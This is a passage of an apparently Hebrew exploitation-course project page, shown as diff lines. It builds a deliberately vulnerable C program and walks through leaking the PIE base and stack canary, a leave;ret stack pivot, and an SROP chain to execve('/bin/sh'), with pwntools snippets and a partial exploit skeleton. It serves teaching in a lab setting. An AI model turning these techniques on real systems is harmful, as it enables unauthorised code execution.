+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="c1">// we pinned pop rdi in the chapter 4 project. In a real binary you would look for them in libc.</span>
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="n">__asm__</span><span class="p">(</span>
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="w">    </span><span class="s">&quot;.intel_syntax noprefix</span><span class="se">\n</span><span class="s">&quot;</span>
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="w">    </span><span class="s">&quot;.global g_syscall</span><span class="se">\n</span><span class="s">&quot;</span>
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="w">    </span><span class="s">&quot;g_syscall:</span><span class="se">\n</span><span class="s">&quot;</span>
+<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="w">    </span><span class="s">&quot;    syscall</span><span class="se">\n</span><span class="s">&quot;</span>
+<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="w">    </span><span class="s">&quot;    ret</span><span class="se">\n</span><span class="s">&quot;</span>
+<a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="w">    </span><span class="s">&quot;.global g_pop_rax</span><span class="se">\n</span><span class="s">&quot;</span>
+<a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span class="w">    </span><span class="s">&quot;g_pop_rax:</span><span class="se">\n</span><span class="s">&quot;</span>
+<a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="w">    </span><span class="s">&quot;    pop rax</span><span class="se">\n</span><span class="s">&quot;</span>
+<a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="w">    </span><span class="s">&quot;    ret</span><span class="se">\n</span><span class="s">&quot;</span>
+<a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a><span class="w">    </span><span class="s">&quot;.att_syntax prefix</span><span class="se">\n</span><span class="s">&quot;</span>
+<a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="p">);</span>
+<a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>
+<a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a><span class="kt">char</span><span class="w"> </span><span class="n">stage</span><span class="p">[</span><span class="mh">0x800</span><span class="p">];</span><span class="w">               </span><span class="c1">// large bss area - the landing area for the pivot</span>
+<a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>
+<a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a><span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+<a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a>
+<a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a><span class="w">    </span><span class="c1">// (1) leak the address of the staging area -&gt; reveals the PIE base.</span>
+<a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;stage @ %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">stage</span><span class="p">);</span>
+<a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a>
+<a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a><span class="w">    </span><span class="c1">// (2) fill the staging area with the full chain (up to 0x800 bytes at a known address).</span>
+<a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a><span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">stage</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">stage</span><span class="p">));</span>
+<a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a>
+<a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a><span class="w">    </span><span class="c1">// (3) the name &quot;feature&quot; - actually a canary leak. We send just enough bytes</span>
+<a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a><span class="w">    </span><span class="c1">//     to overwrite the low null byte of the canary, and puts prints the rest.</span>
+<a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;name&gt; &quot;</span><span class="p">);</span>
+<a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a><span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">80</span><span class="p">);</span><span class="w">            </span><span class="c1">// reaches the canary, not the return address</span>
+<a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a><span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+<a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a>
+<a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a><span class="w">    </span><span class="c1">// (4) the tiny overflow window: exactly up to the end of the return address, not a byte beyond.</span>
+<a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a><span class="w">    </span><span class="c1">//     buf(64) + padding(8) + canary(8) + saved rbp(8) + return addr(8).</span>
+<a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;&gt; &quot;</span><span class="p">);</span>
+<a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a><span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">96</span><span class="p">);</span><span class="w">           </span><span class="c1">// no room for a chain -&gt; pivot required</span>
+<a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a><span class="p">}</span>
+<a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a>
+<a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a><span class="w">    </span><span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">_IONBF</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a><span class="w">    </span><span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span><span class="w">  </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">_IONBF</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a><span class="w">    </span><span class="n">vuln</span><span class="p">();</span>
+<a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a><span class="p">}</span>
+</code></pre></div>
+<p>הקומפילציה, בדיוק עם ההגנות שהגדרנו:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>gcc<span class="w"> </span>-O0<span class="w"> </span>-fstack-protector-all<span class="w"> </span>-fpie<span class="w"> </span>-pie<span class="w"> </span>-Wl,-z,relro,-z,now<span class="w"> </span>-o<span class="w"> </span>chain<span class="w"> </span>chain.c
+</code></pre></div>
+<h2 id="_2">אימות ההגנות והגאדג'טים<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>לפני שכותבים exploit, מוודאים שהבינארי אכן קשוח כמו שתכננו:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>$<span class="w"> </span>checksec<span class="w"> </span>--file<span class="o">=</span>./chain
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Arch:<span class="w">     </span>amd64-64-little
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>RELRO:<span class="w">    </span>Full<span class="w"> </span>RELRO
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>Stack:<span class="w">    </span>Canary<span class="w"> </span>found
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>NX:<span class="w">       </span>NX<span class="w"> </span>enabled
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>PIE:<span class="w">      </span>PIE<span class="w"> </span>enabled
+</code></pre></div>
+<p>עכשיו מאתרים את הרכיבים שנצטרך. הכתובות כאן הן היסטים יחסיים לבסיס ה-PIE (כי הבינארי הוא PIE), והן ישתנו אצלכם - קחו אותן מהפלט שלכם:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>$<span class="w"> </span>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>chain<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;: syscall ; ret$| : pop rax ; ret$&#39;</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>0x00000000000011c6<span class="w"> </span>:<span class="w"> </span>syscall<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>0x00000000000011c9<span class="w"> </span>:<span class="w"> </span>pop<span class="w"> </span>rax<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>$<span class="w"> </span>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>chain<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;: leave ; ret$&#39;</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>0x0000000000001238<span class="w"> </span>:<span class="w"> </span>leave<span class="w"> </span><span class="p">;</span><span class="w"> </span>ret
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="c1"># looking for convenient rsi/rdx gadgets - and intentionally there are none:</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>$<span class="w"> </span>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>chain<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;: pop rsi ; ret$| : pop rdx ; ret$&#39;</span>
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>$
+</code></pre></div>
+<p>השורה האחרונה היא הלב של האתגר. אין <code>pop rsi ; ret</code> ואין <code>pop rdx ; ret</code>, אז אי אפשר פשוט לבנות <code>execve</code> ידני שמסדר את שלושת הארגומנטים בזה אחר זה. יש לנו <code>syscall</code>, יש דרך לשלוט ב-<code>rax</code>, אבל אין דרך נוחה לסדר את <code>rsi</code> ואת <code>rdx</code>. זה בדיוק המצב שבו SROP זורח: הוא משחזר את <strong>כל</strong> האוגרים בבת אחת ממסגרת שאנחנו מניחים על המחסנית.</p>
+<h2 id="_3">התוכנית ההתקפית<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>הרעיון מתחלק לארבעה שלבים, כולם באותה הרצה של אותו תהליך (חשוב - ASLR מגריל מחדש בכל תהליך, ובלי לדלוף מחדש הבסיס ישתנה):</p>
+<ol>
+<li><strong>הleak של PIE.</strong> התוכנית מדפיסה לנו את הכתובת של <code>stage</code>. מכיוון ש-<code>stage</code> יושב בהיסט קבוע מבסיס הבינארי, זה נותן לנו את בסיס ה-PIE, ואיתו את הכתובות של <code>g_syscall</code>, <code>g_pop_rax</code> וגאדג'ט הפיבוט.</li>
+<li><strong>מילוי הבמה.</strong> כותבים את הchain המלאה (כולל מסגרת ה-SROP והמחרוזת <code>/bin/sh</code>) לתוך <code>stage</code>, שכתובתו כבר ידועה לנו.</li>
+<li><strong>הleak של canary.</strong> דרך "פיצ'ר השם" מדליפים את הcanary, כדי שנוכל לכתוב אותו נכון בoverflow.</li>
+<li><strong>פיבוט וירי.</strong> הoverflow הזעירה דורסת את <code>saved rbp</code> בכתובת הבמה ואת return address בגאדג'ט <code>leave ; ret</code>. כשהפונקציה חוזרת, המחסנית מוזזת אל הבמה והchain רצה.</li>
+</ol>
+<p>איך נראית הבמה שאנחנו כותבים ל-<code>stage</code>? זכרו את הטריק מפרק 6.1: הפיבוט עם <code>leave ; ret</code> כולל <code>pop rbp</code> כפול שבולע את 8 הבתים הראשונים. לכן הchain האמיתית מתחילה ב-<code>stage+8</code>, ואת 8 הבתים הראשונים ב-<code>stage+0</code> ננצל לטובתנו - נשים שם דווקא את המחרוזת <code>/bin/sh</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>The staging area (stage) after we wrote to it:
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>+-----------------------------------------+
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>| stage+0x00 : &quot;/bin/sh\0&quot;                |  &lt;-- both padding (swallowed by pop rbp) and the string
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>+-----------------------------------------+
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>| stage+0x08 : g_pop_rax                  |  &lt;-- the chain starts here (ret jumps here)
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>+-----------------------------------------+
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>| stage+0x10 : 15                         |  &lt;-- rax = 15  (rt_sigreturn number)
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>+-----------------------------------------+
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>| stage+0x18 : g_syscall                  |  &lt;-- syscall triggers sigreturn
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>+-----------------------------------------+
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>| stage+0x20 : SigreturnFrame (0xf8 bytes)|  &lt;-- the kernel restores all registers from here
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>|             rax=59, rdi=stage, rsi=0,   |
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>|             rdx=0, rip=g_syscall        |
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>+-----------------------------------------+
+</code></pre></div>
+<p>וזרימת השליטה, צעד אחר צעד, אחרי שהפונקציה <code>vuln</code> חוזרת:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>vuln: leave ; ret     -&gt; rbp = stage,  jumps to the leave;ret gadget
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>leave;ret (the gadget)-&gt; rsp = stage ; pop rbp swallows &quot;/bin/sh&quot; ; rsp = stage+8
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>ret                   -&gt; jumps to [stage+8] = g_pop_rax
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>g_pop_rax             -&gt; rax = 15 ; jumps to g_syscall ; rsp = stage+0x20
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>g_syscall (rax=15)    -&gt; rt_sigreturn reads a frame from rsp = stage+0x20
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>sigreturn             -&gt; loads rax=59, rdi=stage, rsi=0, rdx=0, rip=g_syscall
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>g_syscall (rax=59)    -&gt; execve(&quot;/bin/sh&quot;, 0, 0)  -&gt;  shell
+</code></pre></div>
+<p>שימו לב לאלגנטיות: אותו גאדג'ט <code>syscall ; ret</code> משמש פעמיים - פעם ראשונה כדי לזמן את <code>rt_sigreturn</code> (עם <code>rax=15</code>), ופעם שנייה כ-<code>execve</code> (כש-<code>rax=59</code> נטען מתוך המסגרת). ושימו לב לעוד יופי - <code>execve</code> היא קריאת מערכת, אז אין כאן שום <code>movaps</code> ואין כאב ראש של alignment מחסנית ל-16 בתים, בניגוד ל-<code>system</code> של libc.</p>
+<h2 id="-requirements">דרישות הפרויקט - requirements<a class="headerlink" href="#-requirements" title="Permanent link">&para;</a></h2>
+<p>ה-exploit הסופי שתגישו חייב:</p>
+<ul>
+<li>למצוא את היסטי החולשה (canary, <code>saved rbp</code>, return address) עם <code>cyclic</code> ו/או פירוק ב-gdb, לא בניחוש.</li>
+<li>לדלוף את כתובת <code>stage</code> ולחשב ממנה את בסיס ה-PIE, ומשם את כל הכתובות שבבינארי.</li>
+<li>לדלוף את הcanary ולכתוב אותו נכון בoverflow, כך שבדיקת הcanary עוברת.</li>
+<li>לבצע פיבוט מהחלון הזעיר אל הבמה עם <code>leave ; ret</code>.</li>
+<li>להריץ מהבמה chain שפותחת shell <strong>בלי שום כתובת libc</strong> - הנתיב המרכזי הוא SROP.</li>
+<li>לפתוח shell אינטראקטיבי אמיתי ולהריץ בו לפחות שתי פקודות.</li>
+</ul>
+<p>בנוסף, מומלץ בחום ליישם לפחות אחד מהנתיבים החלופיים (ret2csu או ret2dlresolve) כדי להוכיח שהבנתם למה בחרנו דווקא ב-SROP.</p>
+<h2 id="-milestones">אבני דרך - milestones<a class="headerlink" href="#-milestones" title="Permanent link">&para;</a></h2>
+<p>אל תנסו לכתוב את הכל במכה אחת. עברו דרך אבני הדרך אחת-אחת, וודאו שכל אחת עובדת לפני שממשיכים.</p>
+<h3 id="1-">אבן דרך 1 - הגנות והיסטים<a class="headerlink" href="#1-" title="Permanent link">&para;</a></h3>
+<p>מריצים <code>checksec</code>, מוודאים את התמונה, ומפרקים את <code>vuln</code> כדי לראות איפה יושב הcanary:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>gdb<span class="w"> </span>./chain
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>pwndbg&gt;<span class="w"> </span>disass<span class="w"> </span>vuln
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="c1"># looking for:  lea rax, [rbp-0x50]   (this is buf)   and   mov rax, [rbp-8]  (this is the canary)</span>
+</code></pre></div>
+<p>מהפירוק רואים ש-<code>buf</code> מתחיל ב-<code>rbp-0x50</code> (היסט 80) והcanary ב-<code>rbp-8</code>. כלומר מ-<code>buf</code> עד הcanary יש <code>0x50-8 = 0x48 = 72</code> בתים, אחריהם 8 בתים canary, 8 בתים <code>saved rbp</code>, ו-8 בתים return address. לכן:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>buf[0..71]   : 72 bytes padding (the buffer + alignment padding)
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>buf[72..79]  : the canary
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>buf[80..87]  : saved rbp
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>buf[88..95]  : return addr
+</code></pre></div>
+<p>חלון הoverflow בקריאה (4) הוא 96 בתים בדיוק - עד סוף return address, אף בית מעבר. אין לאן לדחוס chain, וזו ההוכחה שאתם חייבים פיבוט.</p>
+<h3 id="2-leak-pie">אבן דרך 2 - leak של PIE וחישוב הבסיס<a class="headerlink" href="#2-leak-pie" title="Permanent link">&para;</a></h3>
+<p>קוראים את הכתובת שהתוכנית מדפיסה ומחשבים בסיס:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;stage @ &#39;</span><span class="p">)</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="n">stage</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">stage</span> <span class="o">-</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;stage&#39;</span><span class="p">]</span>    <span class="c1"># sets the base for all symbols</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;stage    @ </span><span class="si">%#x</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">stage</span><span class="p">)</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;PIE base @ </span><span class="si">%#x</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
+</code></pre></div>
+<p>תוודאו שהבסיס מסתיים ב-<code>000</code> (מיושר לעמוד). אם לא - קראתם שורה לא נכונה.</p>
+<h3 id="3-leak-canary">אבן דרך 3 - leak של הcanary<a class="headerlink" href="#3-leak-canary" title="Permanent link">&para;</a></h3>
+<p>הcanary מסתיים תמיד בבית <code>\x00</code> תחתון (מיטיגציה נגד leak במחרוזות). הטריק: שולחים בדיוק 73 בתים - 72 padding ועוד בית אחד שדורס את בית ה-null התחתון של הcanary. עכשיו <code>puts</code> לא נעצר שם, וממשיך להדפיס את 7 בתי הcanary הגבוהים:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;name&gt; &#39;</span><span class="p">)</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">73</span><span class="p">)</span>                 <span class="c1"># 72 padding + a byte that overwrites the low null of the canary</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>               <span class="c1"># &#39;A&#39;*73 + canary[1..7] + ...</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">resp</span><span class="p">[</span><span class="mi">73</span><span class="p">:</span><span class="mi">80</span><span class="p">])</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;canary @ </span><span class="si">%#x</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">canary</span><span class="p">)</span>
+</code></pre></div>
+<p>מרכיבים את הcanary בחזרה עם <code>\x00</code> תחתון קבוע ועם 7 הבתים שדלפו. הבסיס לוגי: הcanary הוא ערך 64 ביט little-endian שהבית התחתון שלו 0, אז 7 הבתים העליונים הם החתימה שדלפנו.</p>
+<h3 id="4-srop">אבן דרך 4 - פיבוט וירי SROP<a class="headerlink" href="#4-srop" title="Permanent link">&para;</a></h3>
+<p>בונים את הבמה ואת payload הפיבוט, שולחים, ומקבלים shell. זה הפתרון המלא בסוף העמוד. תבנו אותו בהדרגה: קודם תוודאו ב-gdb שהפיבוט מנחית את <code>rsp</code> ב-<code>stage+8</code> (שימו breakpoint על <code>g_pop_rax</code> וראו את <code>rsp</code>), ורק אז תוסיפו את מסגרת ה-SROP.</p>
+<h2 id="-exploit-starting-skeleton">שלד ה-exploit - starting skeleton<a class="headerlink" href="#-exploit-starting-skeleton" title="Permanent link">&para;</a></h2>
+<p>הנה נקודת פתיחה. השלימו את מה שמסומן ב-TODO:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="ch">#!/usr/bin/env python3</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./chain&#39;</span><span class="p">)</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="n">CANARY_OFF</span> <span class="o">=</span> <span class="mi">72</span>          <span class="c1"># buf -&gt; canary (milestone 1)</span>
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="n">LEAVE_RET</span>  <span class="o">=</span> <span class="mh">0x1238</span>      <span class="c1"># ROPgadget --binary chain | grep &#39;: leave ; ret&#39;  (offset; verify on your side)</span>
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="k">def</span><span class="w"> </span><span class="nf">start</span><span class="p">():</span>
+<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>    <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./chain&#39;</span><span class="p">)</span>    <span class="c1"># local; replace with remote(HOST, PORT) against a server</span>
+<a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>
+<a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>
+<a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a><span class="c1"># (1) PIE leak</span>
+<a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;stage @ &#39;</span><span class="p">)</span>
+<a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a><span class="n">stage</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
